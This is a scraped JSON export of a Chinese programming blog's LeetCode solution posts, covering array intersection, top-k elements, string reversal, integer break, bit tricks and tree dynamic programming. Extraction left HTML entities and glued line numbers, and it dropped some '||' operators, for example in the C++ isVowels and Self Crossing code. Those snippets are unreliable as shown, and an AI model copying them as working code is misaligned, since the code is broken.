&#125; int ans = 0; for (int i = 0; i &lt; n; i++) ans = max(ans, dp[i]); return ans; &#125;&#125;; Python 1234567891011121314151617181920212223242526class Solution(object): def maxEnvelopes(self, envelopes): &quot;&quot;&quot; :type envelopes: List[List[int]] :rtype: int &quot;&quot;&quot; def lower_bound(arrays, L, R, x): while L &lt; R: mid = (L + R) &gt;&gt; 1 if x &lt;= arrays[mid]: R = mid else: L = mid + 1 return L if not envelopes: return 0 A = sorted(envelopes, lambda x, y: x[0] - y[0] if x[0] != y[0] else y[1] - x[1]) n = len(A) dp = [1] * n g = [0x7fffffff] * (n + 1) for i in xrange(n): k = lower_bound(g, 1, n, A[i][1]) dp[i] = k g[k] = A[i][1] return max(dp) 本题是leetcode 354 Russian Doll Envelopes 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 349 Intersection of Two Arrays || leetcode 350 Intersection of Two Arrays II","slug":"leetcode-intersection-two-arrays","date":"2016-05-18T23:57:43.000Z","updated":"2021-01-08T13:32:16.851Z","comments":true,"path":"leetcode-intersection-two-arrays/","link":"","permalink":"https://www.hrwhisper.me/leetcode-intersection-two-arrays/","excerpt":"leetcode Intersection of Two Arrays Given two arrays, write a function to compute their intersection. Example: Given nums1 = [1, 2, 2, 1], nums2 = [2, 2], return [2]. Note: Each element in the result must be unique. The result can be in any order.","text":"leetcode Intersection of Two Arrays Given two arrays, write a function to compute their intersection. Example: Given nums1 = [1, 2, 2, 1], nums2 = [2, 2], return [2]. Note: Each element in the result must be unique. The result can be in any order. 题目地址：leetcode Intersection of Two Arrays 题意：给定两个数组，求他们的交集（不算重复） 思路：太TM水了，直接上哈希表即可。。。 Python 12345678910111213class Solution(object): def intersection(self, nums1, nums2): &quot;&quot;&quot; :type nums1: List[int] :type nums2: List[int] :rtype: List[int] &quot;&quot;&quot; ans = [] nums1 = set(nums1) for num in nums2: if num in nums1: ans.append(num) return list(set(ans)) #remove duplicate 当然也可以one line 12345678class Solution(object): def intersection(self, nums1, nums2): &quot;&quot;&quot; :type nums1: List[int] :type nums2: List[int] :rtype: List[int] &quot;&quot;&quot; return list(set(nums1) &amp; set(nums2)) C++ 123456789101112class Solution &#123;public: vector&lt;int&gt; intersection(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123; unordered_set&lt;int&gt; vis; unordered_set&lt;int&gt; intersection; vector&lt;int&gt; ans; for (int num : nums1) vis.insert(num); for (int num : nums2) if (vis.find(num) != vis.end()) intersection.insert(num); for (int num : intersection) ans.push_back(num); return ans; &#125;&#125;; Java 12345678910111213class Solution &#123; public int[] intersection(int[] nums1, int[] nums2) &#123; HashSet&lt;Integer&gt; vis1 = new HashSet&lt;Integer&gt;(); HashSet&lt;Integer&gt; intersection = new HashSet&lt;Integer&gt;(); for(int num:nums1) vis1.add(num); for(int num:nums2) if(vis1.contains(num)) intersection.add(num); int []ans = new int[intersection.size()]; int i = 0; for(int num:intersection) ans[i++] = num; return ans; &#125;&#125; leetcode Intersection of Two Arrays II Given two arrays, write a function to compute their intersection. Example: Given nums1 = [1, 2, 2, 1], nums2 = [2, 2], return [2, 2]. Note: Each element in the result should appear as many times as it shows in both arrays. The result can be in any order. Follow up: What if the given array is already sorted? How would you optimize your algorithm? What if nums1's size is small compared to num2's size? Which algorithm is better? What if elements of nums2 are stored on disk, and the memory is limited such that you cannot load all elements into the memory at once? 题目地址：Intersection of Two Arrays II 题意：给定两个数组，求他们的交集（可以重复） 思路：用个字典。。。计数即可。 12345678910111213141516class Solution(object): def intersect(self, nums1, nums2): &quot;&quot;&quot; :type nums1: List[int] :type nums2: List[int] :rtype: List[int] &quot;&quot;&quot; ans = [] nums1 = collections.Counter(nums1) for x in nums2: if x in nums1: ans.append(x) nums1[x] -= 1 if nums1[x] == 0: del nums1[x] return ans 本题是leetcode 349 Intersection of Two Arrays 和 leetcode 350 Intersection of Two Arrays II题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Top K Frequent Elements","slug":"leetcode-top-k-frequent-elements","date":"2016-05-02T07:26:25.000Z","updated":"2021-01-08T13:32:16.880Z","comments":true,"path":"leetcode-top-k-frequent-elements/","link":"","permalink":"https://www.hrwhisper.me/leetcode-top-k-frequent-elements/","excerpt":"leetcode Top K Frequent Elements Given a non-empty array of integers, return the k most frequent elements. For example, Given [1,1,1,2,2,3] and k = 2, return [1,2]. Note: You may assume k is always valid, 1 ≤ k ≤ number of unique elements. Your algorithm's time complexity must be better than O(n log n), where n is the array's size.","text":"leetcode Top K Frequent Elements Given a non-empty array of integers, return the k most frequent elements. For example, Given [1,1,1,2,2,3] and k = 2, return [1,2]. Note: You may assume k is always valid, 1 ≤ k ≤ number of unique elements. Your algorithm's time complexity must be better than O(n log n), where n is the array's size. 题目地址：leetcode Top K Frequent Elements 题意： 给定一个数组，返回其出现次数最多的k个元素，要求复杂度小于O(nlogn) 思路： 首先扫一遍数组进行计数。 接着用一个长度为k 堆，存储出现次数最多的元素（堆顶的元素最小，每次和堆顶的元素比较即可） C++ 12345678910111213141516171819202122232425typedef pair&lt;int, int&gt; P;class Solution &#123;public: vector&lt;int&gt; topKFrequent(vector&lt;int&gt;&amp; nums, int k) &#123; unordered_map&lt;int, int&gt; cnt; for (int x : nums) cnt[x] ++; priority_queue&lt;P, vector&lt;P&gt;, greater&lt;P&gt; &gt; q; for (auto &amp;x : cnt) &#123; if (q.size() &lt; k) q.push(make_pair(x.second, x.first)); else &#123; if (q.top().first &lt; x.second) &#123; q.pop(); q.push(make_pair(x.second, x.first)); &#125; &#125; &#125; vector&lt;int&gt; ans; while (!q.empty()) &#123; ans.push_back(q.top().second); q.pop(); &#125; return ans; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def topKFrequent(self, nums, k): &quot;&quot;&quot; :type nums: List[int] :type k: int :rtype: List[int] &quot;&quot;&quot; counts = collections.Counter(nums) heap = [] for key, cnt in counts.items(): if len(heap) &lt; k: heapq.heappush(heap, (cnt, key)) else: if heap[0][0] &lt; cnt: heapq.heappop(heap) heapq.heappush(heap, (cnt, key)) return [x[1] for x in heap] 本题是leetcode 347 Top K Frequent Elements 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 344 Reverse String || leetcode 345 Reverse Vowels of a String","slug":"leetcode-345-reverse-vowels-string-leetcode-344-reverse-string","date":"2016-04-23T10:41:50.000Z","updated":"2021-01-08T13:32:16.889Z","comments":true,"path":"leetcode-345-reverse-vowels-string-leetcode-344-reverse-string/","link":"","permalink":"https://www.hrwhisper.me/leetcode-345-reverse-vowels-string-leetcode-344-reverse-string/","excerpt":"leetcode Reverse String Write a function that takes a string as input and returns the string reversed. Example: Given s = \"hello\", return \"olleh\".","text":"leetcode Reverse String Write a function that takes a string as input and returns the string reversed. Example: Given s = \"hello\", return \"olleh\". 题目地址：leetcode Reverse String 题意:给定一个字符串，让你逆序 思路： 双指针，直接置换 C++ 1234567891011class Solution &#123;public: string reverseString(string s) &#123; for(int L = 0,R = s.size()-1; L &lt; R;L++,R--)&#123; char temp = s[L]; s[L] = s[R]; s[R] = temp; &#125; return s; &#125;&#125;; 也可以直接用swap 123456789class Solution &#123;public: string reverseString(string s) &#123; for(int L = 0,R = s.size()-1; L &lt; R;L++,R--)&#123; swap(s[L],s[R]); &#125; return s; &#125;&#125;; Python 直接oneline 1234567class Solution(object): def reverseString(self, s): &quot;&quot;&quot; :type s: str :rtype: str &quot;&quot;&quot; return s[::-1] leetcode Reverse Vowels of a String Write a function that takes a string as input and reverse only the vowels of a string. Example 1: Given s = \"hello\", return \"holle\". Example 2: Given s = \"leetcode\", return \"leotcede\". 题目地址：leetcode Reverse Vowels of a String 题意：给定一个字符串，把它的所有元音字母逆序 思路：同样双指针，遇到元音（a,e,i,o,u 注意大小写）就停下来 C++ 123456789101112131415161718class Solution &#123;public: bool isVowels(char x)&#123; x = tolower(x); return x ==&#x27;a&#x27; x== &#x27;e&#x27; x==&#x27;i&#x27; x==&#x27;o&#x27; x==&#x27;u&#x27; ; &#125; string reverseVowels(string s) &#123; int L = -1,R = s.size(),n =s.size(); while(L &lt; R)&#123; while(!isVowels(s[++L]) &amp;&amp; L &lt; R); while(!isVowels(s[--R]) &amp;&amp; R &gt; L); if(L &gt;= R) break; swap(s[L], s[R]); &#125; return s; &#125;&#125;; PS:本来不想写题解的，昨天那题太水了= =不过今天又出了一道类似的水题，就一起写了吧 本题是leetcode 344 Reverse String 和 345 Reverse Vowels of a String 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Integer Break","slug":"leetcode-integer-break","date":"2016-04-19T08:02:41.000Z","updated":"2020-11-08T08:09:22.644Z","comments":true,"path":"leetcode-integer-break/","link":"","permalink":"https://www.hrwhisper.me/leetcode-integer-break/","excerpt":"leetcode Integer Break Given a positive integer n, break it into the sum of at least two positive integers and maximize the product of those integers. Return the maximum product you can get. For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). Note: you may assume that n is not less than 2.","text":"leetcode Integer Break Given a positive integer n, break it into the sum of at least two positive integers and maximize the product of those integers. Return the maximum product you can get. For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). Note: you may assume that n is not less than 2. 题目地址：leetcode Integer Break 题意:给定整数n（n&gt;=2），把它分解为若干个整数的和，且这些整数的乘积最大。 思路： 一觉起来发现李大牛出题了。。 这种题肯定是DP嘛 设dp[i]为最大的乘积值，水水的O(n^2)代码如下： 123456789class Solution: def cuttingRope(self, n: int) -&gt; int: dp = [1] * (n + 1) for i in range(1, n + 1): for j in range(1, i + 1): if i + j &gt; n: break dp[i + j] = max(dp[i + j], max(dp[i], i) * max(dp[j], j)) return dp[n] 但是hint说可以O(n)! 在n &gt;3的情况下，我们处理一个数拆分成2，要么拆分成3，（4的话相当于2个2 ， 拆成1的话乘积太小了），所以就可以这样啦： 12345678910class Solution: def cuttingRope(self, n: int) -&gt; int: if n &lt;= 3: return n - 1 dp = [0] * (n + 1) dp[1] = 1 dp[2] = 2 dp[3] = 3 for i in range(4, n + 1): dp[i] = max(dp[i - 3] * 3, dp[i - 2] * 2) return dp[n] 然而还可以继续优化： 可以说，拆成3的比拆成2的乘积大。 比如6的时候 \\(2*2*2 &lt; 3*3\\) 我们希望能尽可能的拆成3，然后才是2. 所以，如果 n % 3 == 0: 那么全部拆成3 n % 3 == 1: 2个2剩下的为3 \\(4*3^{(x-1)} &gt; 1*3^x\\) n % 3 == 2: 1个2剩下的为3 1234567891011class Solution(object): def integerBreak(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; if n &lt;= 3 :return n-1 mod = n % 3 if mod == 0: return pow(3, n / 3) if mod == 1: return 4 * pow(3, (n - 4) / 3) return 2 * pow(3, n / 3) Python 3版本 12345678910class Solution: def cuttingRope(self, n: int) -&gt; int: if n &lt;= 3: return n - 1 mod = n % 3 if mod == 0: return 3 ** (n // 3) elif mod == 1: return 4 * 3 ** (n // 3 - 1) else: return 2 * 3 ** (n // 3) 本题是leetcode 343 Integer Break 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Power of Four","slug":"leetcode-power-four","date":"2016-04-18T03:06:26.000Z","updated":"2021-01-08T13:32:16.859Z","comments":true,"path":"leetcode-power-four/","link":"","permalink":"https://www.hrwhisper.me/leetcode-power-four/","excerpt":"leetcode Power of Four Given an integer (signed 32 bits), write a function to check whether it is a power of 4. Example: Given num = 16, return true. Given num = 5, return false. Follow up: Could you solve it without loops/recursion?","text":"leetcode Power of Four Given an integer (signed 32 bits), write a function to check whether it is a power of 4. Example: Given num = 16, return true. Given num = 5, return false. Follow up: Could you solve it without loops/recursion? 题目地址：leetcode Power of Four 题意: 给定一个有符号整形，让你判断它是不是4的次方数 思路： 方法一： 直接循环求解（每次看看能不能整除，每次除以4），这里就不贴代码了。 方法二 power of two的时候，我们用 n &amp;(n-1) ==0 来判断是否是2的次方数，这里也先判断一下是否为2的次方数。然后再把不是4的次方数排除掉，比如8. 我们来看看2的次方数的规律： 1234567891011121314151 &#x3D;&gt; 110 &#x3D;&gt; 2100 &#x3D;&gt; 41000 &#x3D;&gt; 810000 &#x3D;&gt; 16100000 &#x3D;&gt; 321000000 &#x3D;&gt; 6410000000 &#x3D;&gt; 128100000000 &#x3D;&gt; 2561000000000 &#x3D;&gt; 51210000000000 &#x3D;&gt; 1024100000000000 &#x3D;&gt; 20481000000000000 &#x3D;&gt; 409610000000000000 &#x3D;&gt; 8192100000000000000 &#x3D;&gt; 16384 我们发现，每次不过是将1向左移动一个位置，然后低位补0（这不是废话么= =） 那么4的次方数就是将1向左移动两个位置喽 （还是废话（╯－＿－）╯╧╧） 观察一下位置，4的次方中的1只出现在奇数的位置上！就是说，上面的二进制从右往左，第1，3，5，……位置上。 So，如果我们与上一个可以在奇数上面选择位置的数，也就是 0101 0101 ……那么就把不是4次方的排除掉啦 0101 0101 …… 十六进制表示为： 0x55555555 C++ 123456class Solution &#123;public: bool isPowerOfFour(int num) &#123; return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) ==0 &amp;&amp; (num &amp; 0x55555555) !=0; &#125;&#125;; Java 12345public class Solution &#123; public boolean isPowerOfFour(int num) &#123; return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) ==0 &amp;&amp; (num &amp; 0x55555555) !=0; &#125;&#125; Python 1234567class Solution(object): def isPowerOfFour(self, num): &quot;&quot;&quot; :type num: int :rtype: bool &quot;&quot;&quot; return num &gt; 0 and num &amp; (num - 1) == 0 and num &amp; 0x55555555 != 0 本题是leetcode 342 Power of Four solution 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/ 附带上power of two题解 leetcode 231 Power of Two Given an integer, write a function to determine if it is a power of two. 题目地址：leetcode Power of Two 题意: 给定一个整形，让你判断它是不是2的次方数 思路： 方法一： 直接循环求解（每次看看能不能整除，每次除以2） 方法二 123bool isPowerOfTwo(int n) &#123; return n &gt; 0 &amp;&amp; !(n &amp; (n-1));&#125;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"https://www.hrwhisper.me/tags/Bit-Manipulation/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Counting Bits","slug":"leetcode-counting-bits","date":"2016-03-17T23:41:10.000Z","updated":"2021-01-08T13:32:16.835Z","comments":true,"path":"leetcode-counting-bits/","link":"","permalink":"https://www.hrwhisper.me/leetcode-counting-bits/","excerpt":"leetcode Counting Bits Given a non negative integer number num. For every numbers i in the range 0 ≤ i ≤ num calculate the number of 1's in their binary representation and return them as an array. Example: For num = 5 you should return [0,1,1,2,1,2]. Follow up: It is very easy to come up with a solution with run time **O(n*sizeof(integer)). But can you do it in linear time O(n)** /possibly in a single pass? Space complexity should be O(n). Can you do it like a boss? Do it without using any builtin function like **__builtin_popcount** in c++ or in any other language.","text":"leetcode Counting Bits Given a non negative integer number num. For every numbers i in the range 0 ≤ i ≤ num calculate the number of 1's in their binary representation and return them as an array. Example: For num = 5 you should return [0,1,1,2,1,2]. Follow up: It is very easy to come up with a solution with run time **O(n*sizeof(integer)). But can you do it in linear time O(n)** /possibly in a single pass? Space complexity should be O(n). Can you do it like a boss? Do it without using any builtin function like **__builtin_popcount** in c++ or in any other language. 题目地址：leetcode Counting Bits 题意：给定一个数num，求0~num中每个数的1的个数 思路： 方法一 想一想，当一个数为2的整数幂的时候，1的个数为1，比如2（10) 和4(100)，8(1000) 在这之后就是前一个序列的数+1 比如 9(1001) = 1(1) + 8 (1) = 2 就是把一个数分解为小于它的最大2的整数幂 + x C++ 12345678910111213141516171819class Solution &#123;public: vector&lt;int&gt; countBits(int num) &#123; vector&lt;int&gt; res = vector&lt;int&gt;(num+1,0); int pow2 = 1,before =1; for(int i=1;i&lt;=num;i++)&#123; if (i == pow2)&#123; before = res[i] = 1; pow2 &lt;&lt;= 1; &#125; else&#123; res[i] = res[before] + 1; before += 1; &#125; &#125; return res; &#125;&#125;; Java 1234567891011121314151617public class Solution &#123; public int[] countBits(int num) &#123; int[] res = new int[num+1]; int pow2 = 1,before =1; for(int i=1;i&lt;=num;i++)&#123; if (i == pow2)&#123; before = res[i] = 1; pow2 &lt;&lt;= 1; &#125; else&#123; res[i] = res[before] + 1; before += 1; &#125; &#125; return res; &#125;&#125; Python 12345678910111213141516class Solution(object): def countBits(self, num): &quot;&quot;&quot; :type num: int :rtype: List[int] &quot;&quot;&quot; res = [0] * (num + 1) before = pow2 = 1 for i in xrange(1,num + 1): if i == pow2: before = res[i] = 1 pow2 &lt;&lt;= 1 else: res[i] = res[before] + 1 before += 1 return res 方法二 倒过来想，一个数 * 2 就是把它的二进制全部左移一位，也就是说 1的个数是相等的。 那么我们可以利用这个结论来做。 res[i /2] 然后看看最低位是否为1即可（上面*2一定是偶数，这边比如15和14除以2都是7，但是15时通过7左移一位并且+1得到，14则是直接左移） 所以res[i] = res[i &gt;&gt;1] + (i&amp;1) C++ 12345678910class Solution &#123;public: vector&lt;int&gt; countBits(int num) &#123; vector&lt;int&gt; res = vector&lt;int&gt;(num+1,0); for(int i=1;i&lt;=num;i++)&#123; res[i] = res[i &gt;&gt; 1] + (i &amp; 1); &#125; return res; &#125;&#125;; Java 123456789public class Solution &#123; public int[] countBits(int num) &#123; int[] res = new int[num+1]; for(int i=1;i&lt;=num;i++)&#123; res[i] = res[i &gt;&gt; 1] + (i &amp; 1); &#125; return res; &#125;&#125; Python 12345678910class Solution(object): def countBits(self, num): &quot;&quot;&quot; :type num: int :rtype: List[int] &quot;&quot;&quot; res = [0] * (num + 1) for i in xrange(1,num + 1): res[i] = res[i &gt;&gt; 1] + (i &amp; 1) return res 本题是leetcode 338 Counting Bits题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode House Robber III","slug":"leetcode-house-robber-iii","date":"2016-03-12T11:09:28.000Z","updated":"2021-01-08T13:32:16.849Z","comments":true,"path":"leetcode-house-robber-iii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-house-robber-iii/","excerpt":"leetcode House Robber III The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the \"root.\" Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that \"all houses in this place forms a binary tree\". It will automatically contact the police if two directly-linked houses were broken into on the same night. Determine the maximum amount of money the thief can rob tonight without alerting the police. Example 1: 12345 3 &#x2F; \\2 3 \\ \\ 3 1 Maximum amount of money the thief can rob = 3 + 3 + 1 = 7. Example 2: 12345 3 &#x2F; \\ 4 5 &#x2F; \\ \\ 1 3 1 Maximum amount of money the thief can rob = 4 + 5 = 9.","text":"leetcode House Robber III The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the \"root.\" Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that \"all houses in this place forms a binary tree\". It will automatically contact the police if two directly-linked houses were broken into on the same night. Determine the maximum amount of money the thief can rob tonight without alerting the police. Example 1: 12345 3 &#x2F; \\2 3 \\ \\ 3 1 Maximum amount of money the thief can rob = 3 + 3 + 1 = 7. Example 2: 12345 3 &#x2F; \\ 4 5 &#x2F; \\ \\ 1 3 1 Maximum amount of money the thief can rob = 4 + 5 = 9. 题目地址：leetcode House Robber III 题意：给定一棵二叉树，求能获取的权值最大和（相邻的不能同时取） 思路: 树形dp 显然有： rob_root = max(rob_L + rob_R , no_rob_L + no_nob_R + root.val) no_rob_root = rob_L + rob_R 递归即可 Python: 12345678910111213class Solution(object): def rob(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: int &quot;&quot;&quot; return self.dfs_rob(root)[0] def dfs_rob(self, root): if not root: return 0,0 rob_L, no_rob_L = self.dfs_rob(root.left) rob_R, no_rob_R = self.dfs_rob(root.right) return max(no_rob_L + no_rob_R + root.val , rob_L + rob_R), rob_L + rob_R C++ 1234567891011121314151617class Solution &#123;public: int rob(TreeNode* root) &#123; return dfs(root).first; &#125; pair&lt;int, int&gt; dfs(TreeNode* root)&#123; pair&lt;int, int&gt; dp = make_pair(0,0); if(root)&#123; pair&lt;int, int&gt; dp_L = dfs(root-&gt;left); pair&lt;int, int&gt; dp_R = dfs(root-&gt;right); dp.second = dp_L.first + dp_R.first; dp.first = max(dp.second ,dp_L.second + dp_R.second + root-&gt;val); &#125; return dp; &#125;&#125;; Java 12345678910111213141516public class Solution &#123; public int rob(TreeNode root) &#123; return dfs(root)[0]; &#125; private int[] dfs(TreeNode root) &#123; int dp[]=&#123;0,0&#125;; if(root != null)&#123; int[] dp_L = dfs(root.left); int[] dp_R = dfs(root.right); dp[1] = dp_L[0] + dp_R[0]; dp[0] = Math.max(dp[1] ,dp_L[1] + dp_R[1] + root.val); &#125; return dp; &#125;&#125; 本题是leetcode 337 House Robber III 题解， 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Self Crossing","slug":"leetcode-self-crossing","date":"2016-02-23T07:53:56.000Z","updated":"2021-01-08T13:32:16.867Z","comments":true,"path":"leetcode-self-crossing/","link":"","permalink":"https://www.hrwhisper.me/leetcode-self-crossing/","excerpt":"leetcode Self Crossing You are given an array x of n positive numbers. You start at point (0,0) and moves x[0] metres to the north, then x[1] metres to the west,x[2] metres to the south, x[3] metres to the east and so on. In other words, after each move your direction changes counter-clockwise. Write a one-pass algorithm with O(1) extra space to determine, if your path crosses itself, or not. Example 1: Given x = [2, 1, 1, 2] Return true (self crossing) Example 2: Given x = [1, 2, 3, 4] Return false (not self crossing) Example 3: Given x = [1, 1, 1, 1] Return true (self crossing)","text":"leetcode Self Crossing You are given an array x of n positive numbers. You start at point (0,0) and moves x[0] metres to the north, then x[1] metres to the west,x[2] metres to the south, x[3] metres to the east and so on. In other words, after each move your direction changes counter-clockwise. Write a one-pass algorithm with O(1) extra space to determine, if your path crosses itself, or not. Example 1: Given x = [2, 1, 1, 2] Return true (self crossing) Example 2: Given x = [1, 2, 3, 4] Return false (not self crossing) Example 3: Given x = [1, 1, 1, 1] Return true (self crossing) 题目地址：leetcode Self Crossing 题意： 给定一个数组x，代表行走的距离，最初的方向是北，每走一次就按逆时针顺序变化方向（北、西、南、东） 要求只遍历一次x并且用O(1)的存储空间 判断走过的路径是否交叉。 思路： 感觉有点像海龟作图→_→ There are only 3 scenarios where it won't cross itself. The distances of the moves parallel to each other keeps going up (growing spiral). The distances of the moves parallel to each other keeps going down (shrinking spiral). The distances of the moves parallel to each other first keeps going up, then keeps going down (shrinking spiral inside of the growing spiral), and never goes up. from https://leetcode.com/discuss/88038/java-o-n-o-1-0ms-solution-with-explanation 不交叉的有以下三种情况 平行移动的距离是不断的增加的（螺旋形上升） 平行移动的距离是不断的减少的（螺旋形下降） 平行移动的距离先增加后减少，并且再也不增加。 C++ 12345678910111213141516171819202122232425class Solution &#123;public: bool isSelfCrossing(vector&lt;int&gt;&amp; x) &#123; int n = x.size(); if(n &lt; 4) return false; int t1 = 0,t2 = x[0],t3 = x[1],t4 = x[2],t5; bool increase = t4 &gt; t2? true:false; for(int i=3;i&lt;n;i++)&#123; t5 = x[i]; if(increase &amp;&amp; t3 &gt;= t5)&#123; if(t5 + t1 &lt;t3 i + 1 &lt;n &amp;&amp; x[i+1] + t2 &lt; t4) increase = false; else if (i + 1 &lt;n) return true; &#125; else if(!increase &amp;&amp; t3 &lt;= t5) return true; t1 = t2; t2 = t3; t3 = t4; t4 = t5; &#125; return false; &#125;&#125;; Java 123456789101112131415161718192021222324public class Solution &#123; public boolean isSelfCrossing(int[] x) &#123; int n = x.length; if (n &lt; 4) return false; int t1 = 0, t2 = x[0], t3 = x[1], t4 = x[2], t5; boolean increase = t4 &gt; t2 ? true : false; for (int i = 3; i &lt; n; i++) &#123; t5 = x[i]; if (increase &amp;&amp; t3 &gt;= t5) &#123; if (t5 + t1 &lt; t3 || i + 1 &lt; n &amp;&amp; x[i + 1] + t2 &lt; t4) increase = false; else if (i + 1 &lt; n) return true; &#125; else if (!increase &amp;&amp; t3 &lt;= t5) return true; t1 = t2; t2 = t3; t3 = t4; t4 = t5; &#125; return false; &#125;&#125; Python 123456789101112131415161718192021class Solution(object): def isSelfCrossing(self, x): &quot;&quot;&quot; :type x: List[int] :rtype: bool &quot;&quot;&quot; n = len(x) if n &lt; 4: return False t1, (t2, t3, t4) = 0, x[:3] increase = True if t2 &lt; t4 else False for i in xrange(3, n): t5 = x[i] if increase and t3 &gt;= t5: if t5 + t1 - t3 &lt; 0 or i + 1 &lt; n and x[i + 1] + t2 - t4 &lt; 0: increase = False elif i + 1 &lt; n: return True elif not increase and t3 &lt;= t5: return True t1, t2, t3, t4 = t2, t3, t4, t5 return False 更漂亮的解法： from: https://leetcode.com/discuss/88054/java-oms-with-explanation 123456789101112131415161718192021222324252627282930313233class Solution &#123;public: bool isSelfCrossing(vector&lt;int&gt;&amp; x) &#123; for(int i=3, l=x.size(); i&lt;l; i++) &#123; // Case 1: current line crosses the line 3 steps ahead of it if(x[i]&gt;=x[i-2] &amp;&amp; x[i-1]&lt;=x[i-3]) return true; // Case 2: current line crosses the line 4 steps ahead of it else if(i&gt;=4 &amp;&amp; x[i-1]==x[i-3] 